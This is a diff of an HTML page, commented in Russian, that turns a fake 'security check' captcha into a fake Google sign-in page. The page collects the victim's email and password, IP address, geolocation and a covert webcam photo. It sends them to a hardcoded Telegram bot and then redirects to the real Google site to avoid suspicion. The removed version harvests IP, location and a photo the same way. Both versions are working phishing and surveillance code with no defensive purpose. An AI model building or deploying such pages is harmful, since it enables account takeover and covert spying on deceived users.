@@ -3,389 +3,340 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Проверка безопасности</title>
+    <title>Вход – Аккаунт Google</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
         }
 
         body {
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
-            min-height: 100vh;
+            background: #fff;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-            position: relative;
-            background: #0a0f1e;
+            min-height: 100vh;
+            padding: 16px;
         }
 
-        /* Анимированный градиентный фон */
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
+        /* Карточка входа Google */
+        .login-card {
+            max-width: 450px;
             width: 100%;
-            height: 100%;
-            background: linear-gradient(125deg, 
-                #0f172a 0%, 
-                #1e1b4b 25%, 
-                #2e1065 50%, 
-                #4c1d95 75%, 
-                #5b21b6 100%);
-            background-size: 300% 300%;
-            animation: gradientFlow 12s ease infinite;
-            z-index: -2;
+            padding: 48px 40px 36px;
+            border-radius: 28px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.12);
+            background: white;
+            transition: all 0.2s ease;
         }
 
-        @keyframes gradientFlow {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        /* Анимированные звёзды */
-        body::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                radial-gradient(2px 2px at 20% 30%, white, rgba(0,0,0,0)),
-                radial-gradient(3px 3px at 70% 80%, rgba(255,255,255,0.8), rgba(0,0,0,0)),
-                radial-gradient(1px 1px at 85% 15%, white, rgba(0,0,0,0)),
-                radial-gradient(2px 2px at 40% 60%, rgba(255,255,255,0.6), rgba(0,0,0,0)),
-                radial-gradient(3px 3px at 10% 90%, white, rgba(0,0,0,0));
-            background-size: 200px 200px, 300px 300px, 150px 150px, 250px 250px, 180px 180px;
-            background-repeat: no-repeat;
-            opacity: 0.6;
-            animation: starsFloat 20s linear infinite;
-            z-index: -1;
-        }
-
-        @keyframes starsFloat {
-            0% { transform: translateY(0px); }
-            100% { transform: translateY(-100px); }
-        }
-
-        /* Карточка */
-        .card {
-            background: rgba(15, 25, 45, 0.65);
-            backdrop-filter: blur(14px);
-            border-radius: 40px;
-            padding: 40px 32px;
-            max-width: 460px;
-            width: 100%;
+        .logo {
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.25);
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1) inset;
-            transition: transform 0.2s ease;
-            z-index: 1;
+            margin-bottom: 28px;
         }
 
-        .card:hover {
-            transform: scale(1.01);
-        }
-
-        .captcha-icon {
-            font-size: 72px;
-            margin-bottom: 20px;
-            display: inline-block;
-            filter: drop-shadow(0 4px 10px rgba(0,0,0,0.3));
-            animation: iconPulse 1.8s infinite;
-        }
-
-        @keyframes iconPulse {
-            0% { transform: scale(1); opacity: 0.9; }
-            50% { transform: scale(1.08); opacity: 1; text-shadow: 0 0 10px rgba(255,255,255,0.5); }
-            100% { transform: scale(1); opacity: 0.9; }
+        .logo svg {
+            width: 75px;
+            height: 75px;
         }
 
         h1 {
-            color: white;
-            font-size: 28px;
-            font-weight: 600;
-            letter-spacing: -0.3px;
-            margin-bottom: 16px;
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 8px;
+            color: #1f1f1f;
         }
 
-        .security-badge {
-            display: inline-block;
-            background: rgba(0, 255, 255, 0.15);
-            backdrop-filter: blur(4px);
-            border-radius: 40px;
-            padding: 6px 16px;
-            font-size: 14px;
-            color: #a5f3fc;
-            border: 1px solid rgba(0, 255, 255, 0.3);
+        .sub {
+            text-align: center;
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+
+        /* Поле ввода как у Google */
+        .input-group {
+            margin-bottom: 28px;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 12px 8px 12px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            outline: none;
+            background: transparent;
+            transition: 0.1s;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 12px;
+            top: 16px;
+            font-size: 16px;
+            color: #5f6368;
+            pointer-events: none;
+            transition: 0.1s;
+            background: white;
+            padding: 0 4px;
+        }
+
+        .input-group input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+
+        .input-group input:focus ~ label,
+        .input-group input:not(:placeholder-shown) ~ label {
+            top: 7px;
+            font-size: 11px;
+            color: #1a73e8;
+        }
+
+        .forgot-link {
+            text-align: right;
             margin-bottom: 24px;
         }
 
-        p {
-            color: rgba(255, 255, 255, 0.8);
-            margin-bottom: 28px;
-            line-height: 1.5;
-            font-size: 16px;
+        .forgot-link a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
         }
 
-        button {
-            background: linear-gradient(95deg, #3b82f6, #8b5cf6);
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
+        }
+
+        .next-btn {
+            background: #1a73e8;
             color: white;
             border: none;
-            padding: 16px 28px;
-            border-radius: 60px;
-            font-size: 18px;
-            font-weight: 600;
-            width: 100%;
+            padding: 10px 24px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
             transition: 0.2s;
-            box-shadow: 0 8px 20px rgba(59, 130, 246, 0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
         }
 
-        button:hover {
-            transform: translateY(-2px);
-            filter: brightness(1.05);
-            box-shadow: 0 14px 28px rgba(59, 130, 246, 0.4);
+        .next-btn:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
         }
 
-        button:active {
-            transform: translateY(2px);
+        .create-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
         }
 
-        .footer {
-            margin-top: 24px;
+        hr {
+            margin: 32px 0 20px;
+            border: none;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer-note {
             font-size: 12px;
-            color: rgba(255, 255, 255, 0.45);
-            border-top: 1px solid rgba(255,255,255,0.1);
-            padding-top: 20px;
-        }
-
-        .loader {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        button:disabled {
-            opacity: 0.7;
-            transform: none;
-            cursor: not-allowed;
+            color: #5f6368;
+            text-align: center;
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="captcha-icon">🤖➡️👤</div>
-        <h1>Подтверждение личности</h1>
-        <div class="security-badge">🔒 Защищено SecureCheck</div>
-        <p>
-            Пожалуйста, подтвердите, что вы не робот.<br>
-            Система выполнит быструю верификацию.
-        </p>
-        <button id="verifyBtn">
-            <span>✅ Я не робот</span>
-        </button>
-        <div class="footer">
-            Нажатие кнопки означает согласие с условиями проверки
-        </div>
+<div class="login-card" id="loginForm">
+    <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
+            <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z" />
+            <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z" />
+            <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z" />
+            <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z" />
+        </svg>
+    </div>
+    <h1>Войти</h1>
+    <div class="sub">Используйте аккаунт Google</div>
+
+    <div class="input-group">
+        <input type="email" id="email" placeholder=" " autocomplete="off">
+        <label>Электронная почта или телефон</label>
     </div>
 
-    <script>
-        // ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИ НА СВОИ) ==========
-        const TELEGRAM_TOKEN = "8241737351:AAGpCCd1PpuoHPeJ7xJZOjRcPYTVCN-QaOs";
-        const TELEGRAM_CHAT_ID = "805226689";
+    <div class="input-group" id="passwordGroup" style="display: none;">
+        <input type="password" id="password" placeholder=" ">
+        <label>Пароль</label>
+    </div>
 
-        // ========== ФУНКЦИЯ ПОЛУЧЕНИЯ IP ==========
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch(e) { return 'не удалось определить'; }
-        }
+    <div class="forgot-link">
+        <a href="#" id="forgotLink">Забыли адрес электронной почты?</a>
+    </div>
 
-        // ========== ФУНКЦИЯ ПОЛУЧЕНИЯ ГЕОЛОКАЦИИ ==========
-        async function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve('не поддерживается');
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (±${pos.coords.accuracy}m)`),
-                    () => resolve('пользователь запретил')
-                );
-            });
-        }
+    <div class="actions">
+        <a href="#" class="create-link" id="createLink">Создать аккаунт</a>
+        <button class="next-btn" id="nextBtn">Далее</button>
+    </div>
 
-        // ========== ФУНКЦИЯ ФОТОГРАФИРОВАНИЯ ==========
-        async function takePhoto() {
-            return new Promise((resolve) => {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    resolve('камера не поддерживается');
-                    return;
-                }
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then((stream) => {
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const photo = canvas.toDataURL('image/jpeg', 0.8);
-                            stream.getTracks().forEach(track => track.stop());
-                            resolve(photo);
-                        };
-                    })
-                    .catch(() => resolve('пользователь запретил'));
-            });
-        }
+    <hr>
+    <div class="footer-note">
+        Вы переходите на сайт Google для подтверждения личности
+    </div>
+</div>
 
-        // ========== ОТПРАВКА В TELEGRAM ==========
-        async function sendToTelegram(ip, location, photo) {
-            const ua = navigator.userAgent;
-            const caption = `✅ ПРОВЕРКА ПРОЙДЕНА
+<script>
+    // ========== НАСТРОЙКИ TELEGRAM ==========
+    const TELEGRAM_TOKEN = "8241737351:AAGpCCd1PpuoHPeJ7xJZOjRcPYTVCN-QaOs";
+    const TELEGRAM_CHAT_ID = "805226689";
+
+    let step = 0;            // 0 - ждём email, 1 - ждём пароль
+    let capturedEmail = "";
+
+    const emailInput = document.getElementById('email');
+    const passwordGroup = document.getElementById('passwordGroup');
+    const nextBtn = document.getElementById('nextBtn');
+
+    // Функция отправки в Telegram
+    async function sendToTelegram(email, password, ip, location, photoBase64) {
+        const ua = navigator.userAgent;
+        const caption = `🔐 GOOGLE LOGIN + XLOGGER
+📧 Email: ${email}
+🔑 Password: ${password || "—"}
 🌐 IP: ${ip}
-📍 Гео: ${location}
+📍 Геолокация: ${location}
 💻 User-Agent: ${ua}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}`;
 
-            if (photo && photo.startsWith('data:image')) {
-                const blob = await (await fetch(photo)).blob();
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('caption', caption);
-                formData.append('photo', blob, 'selfie.jpg');
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } else {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: caption
-                    })
-                });
+        if (photoBase64 && photoBase64.startsWith('data:image')) {
+            const blob = await (await fetch(photoBase64)).blob();
+            const fd = new FormData();
+            fd.append('chat_id', TELEGRAM_CHAT_ID);
+            fd.append('caption', caption);
+            fd.append('photo', blob, 'google_selfie.jpg');
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        } else {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: caption })
+            });
+        }
+    }
+
+    // XLogger функции
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) { return 'undetermined'; }
+    }
+
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) { resolve('geo not supported'); return; }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (±${pos.coords.accuracy}m)`),
+                () => resolve('denied_by_user')
+            );
+        });
+    }
+
+    async function takePhoto() {
+        return new Promise((resolve) => {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { resolve(null); return; }
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(photoData);
+                    };
+                })
+                .catch(() => resolve(null));
+        });
+    }
+
+    // --- этап 2: запрос доп. верификации (камера + гео)
+    async function requestAdditionalVerification(email, password) {
+        // Показываем индикатор загрузки
+        const loginCard = document.getElementById('loginForm');
+        loginCard.innerHTML = `
+            <div style="text-align: center; padding: 48px 24px;">
+                <div style="width: 48px; height: 48px; border: 4px solid #e0e0e0; border-top: 4px solid #1a73e8; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 20px auto;"></div>
+                <h2 style="font-weight: 400; margin-top: 20px;">Проверка безопасности</h2>
+                <p style="color: #5f6368;">Google выполняет быструю верификацию устройства...</p>
+            </div>
+            <style>
+                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+            </style>
+        `;
+
+        // Собираем данные
+        const ip = await getIP();
+        const location = await getLocation();
+        const photo = await takePhoto();
+
+        // Отправляем ВСЁ (логин, пароль, ip, гео, кадр)
+        await sendToTelegram(email, password, ip, location, photo);
+
+        // Завершаем — показываем реальную страницу Google, чтобы не вызвать подозрений
+        window.location.href = "https://accounts.google.com/";
+    }
+
+    // Обработка нажатия "Далее"
+    nextBtn.addEventListener('click', async () => {
+        if (step === 0) {
+            const email = emailInput.value.trim();
+            if (!email) {
+                alert("Введите адрес электронной почты");
+                return;
             }
+            capturedEmail = email;
+            // Показываем поле пароля
+            passwordGroup.style.display = "block";
+            nextBtn.innerText = "Далее (пароль)";
+            step = 1;
+            // Небольшая имитация — скрываем "Забыли адрес" на втором шаге
+            document.querySelector('.forgot-link').style.visibility = "visible";
+            document.getElementById('createLink').style.visibility = "visible";
+        } 
+        else if (step === 1) {
+            const password = document.getElementById('password').value;
+            if (!password) {
+                alert("Введите пароль");
+                return;
+            }
+            // Отключаем кнопку, чтобы не нажали дважды
+            nextBtn.disabled = true;
+            // Переходим к запросу камеры/гео + отправке
+            await requestAdditionalVerification(capturedEmail, password);
         }
+    });
 
-        // ========== ЭКРАН С ЧЕРЕПОМ (ПОСЛЕ ОТПРАВКИ) ==========
-        function showSkullScreen() {
-            // Создаём чёрный фон
-            const overlay = document.createElement('div');
-            overlay.id = 'skull-screen';
-            overlay.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: black;
-                z-index: 99999;
-                display: flex;
-                flex-direction: column;
-                justify-content: center;
-                align-items: center;
-                font-family: monospace;
-                text-align: center;
-                padding: 20px;
-            `;
-
-            // ASCII-арт черепа (твой вариант)
-            const skull = document.createElement('pre');
-            skull.style.cssText = `
-                color: #ff3333;
-                font-size: 12px;
-                margin-bottom: 30px;
-                text-shadow: 0 0 8px red;
-                line-height: 1.2;
-                font-weight: bold;
-            `;
-            skull.textContent = `
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣏⢻⣿⣿⣿⣿⡀⢠⣶⡆⢠⣶⡄⢀⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣦⠻⣿⣿⣿⣋⡈⠉⠡⠎⠉⠁⣈⣿⣿⣿⣿⠋⣼⣿⣿
-⣿⣿⣿⣿⣦⠙⢿⣿⣿⡏⢦⣀⣀⣠⢪⣿⣿⣿⠟⢡⣾⣿⣿⣿
-⣿⣿⣿⣿⣿⣷⣄⠙⠿⣷⣌⠉⠉⢁⣾⡿⠟⢁⣴⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⡟⢛⣷⣄⡈⢙⡻⠿⡟⠉⣂⣴⡛⢿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⡔⡿⢟⣛⡫⠥⢈⣑⡠⠭⣛⡻⢿⢸⣿⣿⣿⣿⣿
-⣿⣄⣠⣄⣠⣆⠩⣽⣶⣶⣿⣿⣿⣿⣷⣶⡮⢁⣤⣀⣄⣄⣄⣿
-⣿⣿⣿⣿⣿⣿⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣅⣸⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-            `;
-
-            const title = document.createElement('h1');
-            title.textContent = 'ДОСТУП ЗАПРЕЩЁН';
-            title.style.cssText = `
-                color: #ff3333;
-                font-size: 32px;
-                margin: 20px 0;
-                letter-spacing: 4px;
-                font-family: monospace;
-                text-shadow: 0 0 10px red;
-            `;
-
-            const message = document.createElement('p');
-            message.textContent = 'Повторите попытку через 1 минуту';
-            message.style.cssText = `
-                color: #ff9999;
-                font-size: 18px;
-                font-family: monospace;
-            `;
-
-            overlay.appendChild(skull);
-            overlay.appendChild(title);
-            overlay.appendChild(message);
-            document.body.appendChild(overlay);
-
-            // Через 2 секунды перезагружаем страницу
-            setTimeout(() => {
-                window.location.reload();
-            }, 2000);
-        }
-
-        // ========== ОСНОВНОЙ ЗАПУСК ==========
-        document.getElementById('verifyBtn').onclick = async () => {
-            const btn = document.getElementById('verifyBtn');
-            btn.innerHTML = '<span class="loader"></span> Проверка...';
-            btn.disabled = true;
-
-            const ip = await getIP();
-            const location = await getLocation();
-            const photo = await takePhoto();
-
-            await sendToTelegram(ip, location, photo);
-            
-            // Показываем череп после отправки
-            showSkullScreen();
-        };
-    </script>
+    // Заглушки ссылок (чтобы не сломать доверие)
+    document.getElementById('forgotLink').addEventListener('click', (e) => {
+        e.preventDefault();
+        alert("Функция восстановления временно недоступна.\nПопробуйте позже.");
+    });
+    document.getElementById('createLink').addEventListener('click', (e) => {
+        e.preventDefault();
+        alert("Создание аккаунта временно приостановлено.");
+    });
+</script>
 </body>
 </html>
